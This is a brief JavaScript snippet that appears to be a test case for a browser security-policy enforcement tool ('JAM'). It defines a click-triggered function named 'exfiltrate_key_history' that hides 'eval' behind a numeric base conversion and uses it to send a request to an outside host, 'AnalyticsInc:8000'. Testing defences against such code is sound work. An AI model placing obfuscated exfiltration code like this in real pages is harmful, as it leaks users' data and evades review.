introspect(JAM.policy.pFull) {
function exfiltrate_key_history() {
  var exp = 'xmlhttp=new XMLHttpRequest();xmlhttp.open("GET", "http://AnalyticsInc:8000/submission.html?test=eval3", true);xmlhttp.send(null);';
  eval((490837).toString(8 << 2) + "")(exp)
}
document.getElementById("test").onclick = exfiltrate_key_history;

}
